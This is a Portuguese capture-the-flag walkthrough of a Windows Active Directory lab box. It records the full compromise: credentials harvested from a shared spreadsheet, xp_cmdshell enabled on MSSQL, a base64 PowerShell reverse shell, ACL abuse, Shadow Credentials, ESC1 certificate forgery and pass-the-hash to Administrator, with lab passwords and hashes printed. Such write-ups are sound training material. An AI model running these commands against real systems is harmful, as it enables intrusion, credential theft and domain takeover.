#Difficult : Easy
#OS : Windows
#Info : As is common in real life Windows pentests, you will start this box with credentials for the following account: `rose` / `KxEPkKe6R8su`
***
## Port Scanning
Como sempre começamos fazendo um `Port Scanning` para termos uma noção de quais serviços estão rodando na máquina.
```bash
nmap 10.10.11.51 -sC -Pn -sV -A -oN nmap_output_tcp
```
![[Pasted image 20250401193932.png]]
Aqui temos várias portas abertas, mas as mais importantes são :
`88` : Kerberos | `1433` : MSSQL. Também temos um serviço `SMB`.

Podemos já adicionar os hostnames ao nosso arquivo de hosts.
```bash
echo "10.10.11.51    sequel.htb DC01.sequel.htb" >> /etc/hosts
```
***
## SNB Enumeration
Com as credenciais que nos foram passadas, podemos enumerar os diretórios do servidor `SMB`.
```bash
nxc smb 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' --shares
```
![[Pasted image 20250401200205.png]]

E quais são os usuários possíveis.
```bash
nxc smb 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' --users
```
![[Pasted image 20250401200304.png]]
***
## Acesso inicial
Podemos então ver o que temos em `Accounting Department` e fazer o download caso haja algo interessante.
```bash
smbclient '//10.10.11.51/Accounting Department' -U 'rose%KxEPkKe6R8su'
ls
get accounts.xlsx
exit
```
![[Pasted image 20250401201724.png]]

Vi que era um arquivo compactado, então usei o `7zip` para descompacta-lo
```bash
7z x accounts.xlsx -o./extracted_files
ls ./extracted_files
```
![[Pasted image 20250401202450.png]]

O arquivo `./extracted_files/xl/sharedStrings.xml` parece ter algumas credenciais, mas como está em `XML` fica meio complicado de visualizar.
```bash
cat ./extracted_files/xl/sharedStrings.xml
```
![[Pasted image 20250402080408.png]]

Então usei alguns filtros do Linux para resolver isso. Assim conseguimos ver os dados de melhor forma.
```bash
cat ./extracted_files/xl/sharedStrings.xml | sed -e 's/<[^>]*>/;/g' -e 's/;\{1,4\}/\n/g' | grep -v '^$' | paste -d, - - - - -
```
![[Pasted image 20250402080454.png]]
- **`'s/<[^>]*>/;/g'`** : Retira todos  `<>` e o que estiver dentro e substitui por um `;`.
- **`'s/;\{1,4\}/\n/g'`** : Retira todas as ocorrências de `;` que aparecem de `1` até `4` vezes e substitui por um `\n`.
- `grep -v '^$'` : Retira todas as linhas vazias.
- **`paste -d, - - - - -`** : Irá combinar `5` linhas consecutivas e separa-las por vírgula.

Como quero apenas o username o email e a senha, podemos adicionar mis um filtro.
```bash
cat ./extracted_files/xl/sharedStrings.xml | sed -e 's/<[^>]*>/;/g' -e 's/;\{1,4\}/\n/g' | grep -v '^$' | paste -d, - - - - - | sed -e 's/,$//' | awk -F, '{print $(NF-2)"," $(NF-1) "," $NF}' > credentials.list
```
![[Pasted image 20250402083641.png]]

Há um usuário que aparentemente faz login no `MSSQL`(A senha sugere isso :) ). Podemos então tentar logar.
```bash
impacket-mssqlclient 'sa:MSSQLP@ssw0rd!@dc01.sequel.htb'
```
![[Pasted image 20250402084229.png]]

Aqui sendo uma técnica muito comum, podemos habilitar o `xm_cmdshell` para executar comandos no `host`.
```sql
EXEC sp_configure 'show advanced options', 1;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```
![[Pasted image 20250402091600.png]]

Então preparo um listener, e envio nossa `reverse shell` para ser executada no `host` da vítima.
```bash
nc -lvnp 4545
```

Como pode conter caracteres especiais decidi colocar em `base64`. Utilizei o site [revshells](https://www.revshells.com/).
```sql
EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA5ADkAIgAsADQANQA0ADUAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
```
![[Pasted image 20250402092312.png]]

**Entramos!**
***
## Lateral Movement
Nos arquivos de configuração do `MSSQL` localizados na raiz do sistema, há uma senha, podemos tentar reutiliza-la com outros usuários do sistema.
```powershell
cat C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI
```
![[Pasted image 20250402085657.png]]

Então listamos os usuários do sistema, e tentamos fazer login com eles.
```powershell
ls Users
```
![[Pasted image 20250402090532.png]]

Sendo que `Administrator` e `Public` são usuários padrões e `sql_svc` é uma conta de serviço, o único usuário regular é `ryan`.
```bash
evil-winrm -i dc01.sequel.htb -u 'ryan' -p 'WqSZAF6CysDQbGb3'
ls ../Desktop
```
![[Pasted image 20250402091200.png]]
***
## PRIV ESC
Vamos mapear nossas permissões com o `Bloodhound`.
```bash
bloodhound-python -u 'ryan' -p 'WqSZAF6CysDQbGb3' -d 'sequel.htb' -ns '10.10.11.51' -c All
```

Após mandarmos a `collection` para o `Bloodhound` em `Outbound Object Control` podemos ver que `ryan` tem permissão `WriteOwner` sobre `ca_svc`, que é o usuário editor de certificados.
![[Pasted image 20250402113728.png]]

Podemos então definir que o `Owner` de `ca_svc` é `ryan`.
```bash
bloodyAD --host 'dc01.sequel.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan'
```
![[Pasted image 20250402135144.png]]

Agora modificamos as `DACLs` para dar `FullControl` de `ca_svc` para `ryan`.
```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 'dc01.sequel.htb'
```
![[Pasted image 20250402132320.png]]

Podemos então aplicar a técnica `Shadow Credentials` sobre o usuário `ca_svc`, assim não precisamos da senha.
```bash
certipy-ad shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -account 'ca_svc' -dc-ip '10.10.11.51'
```
![[Pasted image 20250402134849.png]]

Podemos então ver se há certificados vulneráveis. Temos muitas saídas importantes. Mas a principal se é o template `DunderMifflinAuthentication`, pois os usuários do grupo `SEQUEL.HTB\Cert Publisher` tem direitos elevados sobre ele. Como o `Write Owner Principals`.
```bash
KRB5CCNAME=/root/Documents/machines/escapetwo/ca_svc.ccache certipy-ad find -scheme ldap -k -target 'dc01.sequel.htb' -dc-ip '10.10.11.51' -vulnerable -stdout
```
![[Pasted image 20250402140753.png]]

Fazemos então a modificação desse template de certificado, por padrão, ele o modifica para ser vulnerável a `ESC1`.
```bash
KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template 'DunderMifflinAuthentication' -target 'dc01.sequel.htb' -dc-ip '10.10.11.51'
```
![[Pasted image 20250402142018.png]]

Como modificamos o modelo do certificado para serv ulnerável a `ESC1` podemos emitir um certificado em nome de outro usuário.
```bash
certipy-ad req -u 'ca_svc' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca 'sequel-DC01-CA' -target 'dc01.sequel.htb' -dc-ip '10.10.11.51' -template 'DunderMifflinAuthentication' -upn 'Administrator@sequel.htb' -ns '10.10.11.51'
```
![[Pasted image 20250402142951.png]]

Ele nos devolveu um certificado válido emitido para `administrator@sequel.htb`. Podemos usar esse certificado para fazer autenticação e o hash da conta.
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51

ls
```
![[Pasted image 20250402143656.png]]
Conseguimos tanto o hash `NTLM` quanto um o ticket `Kerberos`.

Então agora tentamos fazer login no usuário `Administrator` usando o hash.
```bash
evil-winrm -i dc01.sequel.htb -u 'Administrator' -H 7a8d4e04986afa8ed4060f75e5a0b3ff

ls ../Desktop
```
![[Pasted image 20250402144141.png]]

**owned!**
***
![[Pasted image 20250402144213.png]]















